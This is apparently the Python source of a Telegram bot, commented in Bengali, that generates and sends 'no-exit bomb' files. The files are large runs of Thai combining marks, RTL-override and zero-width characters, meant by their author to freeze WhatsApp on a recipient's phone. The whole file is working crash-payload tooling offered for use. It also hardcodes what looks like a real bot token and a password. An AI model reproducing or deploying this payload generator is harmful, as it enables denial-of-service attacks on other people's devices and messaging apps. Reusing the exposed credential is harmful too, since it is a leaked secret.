import logging
import os
import sqlite3
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, MessageHandler, filters, ContextTypes, ConversationHandler

# ১. লগিং সেটআপ
logging.basicConfig(level=logging.INFO)

# ২. আপনার কনফিগারেশন
TOKEN = "8675593212:AAG6_m5ZFEqG-qkutygxbuoOetMv9N87TnY"
CORRECT_PASSWORD = "MIZANUR RAHMAN"

WAITING_FOR_PASSWORD = 1
WAITING_FOR_FILENAME = 2

# ৩. ডাটাবেস ইনিশিয়ালাইজ
def init_db():
    conn = sqlite3.connect('m_r_dev_final.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. মেইন 'নো-এক্সিট' পেলোড জেনারেটর
async def generate_no_exit_bomb(filename, status_msg):
    # ফাইলের নামের সাথে কোনো এক্সটেনশন থাকবে না
    # এটি এমনভাবে তৈরি যা ফোনকে কনফিউজ করবে
    file_path = filename.strip().replace(" ", "_")
    
    # এটি হোয়াটসঅ্যাপের UI কে ফ্রিজ করার জন্য আসল বারুদ
    atomic_energy = (
        "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 400 + # Thai Crash
        "\u202E\u202D" * 300 +                             # RTL Loop
        "\u200B\u200C\u200D\uFEFF" * 350 +                 # Zero Width Jam
        "☢️_M_R_DEVELOPER_BOOM_☢️" * 15
    )
    
    full_content = (atomic_energy + "\n") * 35 

    try:
        await status_msg.edit_text(f"🚀 পারমাণবিক বারুদ ভরা হচ্ছে: {file_path}...")
        # বাইনারি রাইট মেথড যাতে ফাইলটা Raw Data হিসেবে থাকে
        with open(file_path, "w", encoding="utf-8") as f:
            for _ in range(25): 
                f.write(full_content)
        return file_path
    except Exception as e:
        logging.error(e)
        return None

# ৫. হ্যান্ডলার ফাংশনসমূহ
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("🚀 CREATE NO-EXIT BOMB")], [KeyboardButton("📊 STATUS")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "🔥 **M R DEVELOPER ULTIMATE PANEL** 🔥\n\n"
        "এই ফাইল কোনো অ্যাপে ওপেন হবে না।\n"
        "সরাসরি হোয়াটসঅ্যাপের পেটে বিস্ফোরণ ঘটবে।",
        reply_markup=reply_markup
    )
    return ConversationHandler.END

async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔑 **সিক্রেট পাসওয়ার্ড দিন:**", reply_markup=ReplyKeyboardRemove())
    return WAITING_FOR_PASSWORD

async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == CORRECT_PASSWORD:
        await update.message.reply_text("✅ এক্সেস গ্রান্টেড!\nফাইলের নাম কী দিবেন?")
        return WAITING_FOR_FILENAME
    await update.message.reply_text("❌ ভুল পাসওয়ার্ড!")
    return WAITING_FOR_PASSWORD

async def create_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.message.text
    status = await update.message.reply_text("☢️ বাইনারি পেলোড জেনারেট হচ্ছে...")
    
    file_path = await generate_no_exit_bomb(user_name, status)
    
    if file_path:
        with open(file_path, 'rb') as doc:
            # এখানে কোনো MIME Type দেওয়া হয়নি যাতে এটি 'Unknown' হিসেবে যায়
            await update.message.reply_document(
                document=doc,
                caption=f"✅ **NO-EXIT BOMB READY!**\n\n👤 Dev: M R DEVELOPER\n📁 File: `{file_path}`\n\nএটি পাঠালে স্ক্যামারের ফোন ওটাকে বাইরে পাঠানোর কোনো রাস্তা পাবে না।"
            )
        
        # স্ট্যাটাস আপডেট
        conn = sqlite3.connect('m_r_dev_final.db')
        cur = conn.cursor()
        cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
        conn.commit()
        conn.close()
        
        os.remove(file_path)
    
    await status.delete()
    return ConversationHandler.END

# ৬. রানার
def main():
    init_db()
    app = Application.builder().token(TOKEN).build()
    
    conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^🚀 CREATE NO-EXIT BOMB$'), ask_password)],
        states={
            WAITING_FOR_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_password)],
            WAITING_FOR_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_and_send)],
        },
        fallbacks=[MessageHandler(filters.COMMAND, start)],
    )
    
    app.add_handler(conv)
    app.add_handler(MessageHandler(filters.Regex('^/start$'), start))
    app.run_polling()

if __name__ == '__main__':
    main()
    
